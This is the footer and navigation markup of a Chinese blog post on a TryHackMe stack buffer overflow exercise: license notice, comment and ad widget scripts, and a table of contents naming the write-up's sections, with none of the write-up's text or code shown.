        <strong>本文链接：</strong><a href="https://blog.irec.moe/thm_bufferoverflow.html" title="https:&#x2F;&#x2F;blog.irec.moe&#x2F;thm_bufferoverflow.html" target="_blank" rel="noopener">https:&#x2F;&#x2F;blog.irec.moe&#x2F;thm_bufferoverflow.html</a><br>
        
            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可

        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%A0%88/" rel="tag">栈</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1758795296016"></script>
  

  
      <div class="nexmoe-post-footer">
          <script src="https://giscus.app/client.js"
      data-repo="Recopec/Recopec.github.io"
      data-repo-id="R_kgDOHWxLSA"
      data-category="Announcements"
      data-category-id="DIC_kwDOHWxLSM4CYhGk"
      data-mapping="title"
      data-strict="0"
      data-reactions-enabled="1"
      data-emit-metadata="0"
      data-input-position="top"
      data-theme="preferred_color_scheme"
      data-lang="zh-CN"
      data-loading="lazy"
      crossorigin="anonymous"
      async>
</script>

      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            
            
            <button class="mdui-fab catalog" style="overflow:unset;">
                <i class="nexmoefont icon-i-catalog"></i>
                <div class="nexmoe-toc">
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EIP"><span class="toc-number">1.1.</span> <span class="toc-text">EIP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Immunity-Debugger"><span class="toc-number">1.2.</span> <span class="toc-text">Immunity Debugger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mona"><span class="toc-number">1.3.</span> <span class="toc-text">Mona</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88Pattern-String%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">模式字符串（Pattern String）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E5%BA%8F%EF%BC%88Endianness%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">字节序（Endianness）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E7%AC%A6%EF%BC%88Bad-Characters%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">坏字符（Bad Characters）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%9C%BA%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">连接机器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%B4%A9%E6%BA%83%E5%8C%BA%E9%97%B4"><span class="toc-number">3.</span> <span class="toc-text">找崩溃区间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B4%A9%E6%BA%83%E5%A4%8D%E7%8E%B0%E5%92%8C%E6%8E%A7%E5%88%B6-EIP"><span class="toc-number">4.</span> <span class="toc-text">崩溃复现和控制 EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%9D%8F%E5%AD%97%E7%AC%A6"><span class="toc-number">5.</span> <span class="toc-text">找坏字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%90%88%E9%80%82%E7%9A%84%E8%B7%B3%E8%BD%AC%E5%9C%B0%E5%9D%80"><span class="toc-number">6.</span> <span class="toc-text">找合适的跳转地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E9%A9%AC"><span class="toc-number">7.</span> <span class="toc-text">生成马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E6%97%A0%E6%93%8D%E4%BD%9C%E5%AD%97%E8%8A%82%EF%BC%88NOPs%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">准备无操作字节（NOPs）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-number">9.</span> <span class="toc-text">结束</span></a></li></ol>
                </div>
            </button>
            

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
</div><!-- hexo injector body_end start -->
  <script>
  const CODE_CONFIG = {
    beautify: undefined,
    highlightCopy: undefined,
    highlightLang: undefined,
    highlightHeightLimit: undefined,
    isHighlightShrink: undefined,
    copy: {
      success: 'undefined',
      error: 'undefined',
      noSupport: 'undefined',
    }
  };
  console.log(
    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
    "color: #fff; background: #5f5f5f",
    "color: #fff; background: #80c8f8",
    ""
  );
  </script>
  <!-- hexo injector body_end end --></body></html>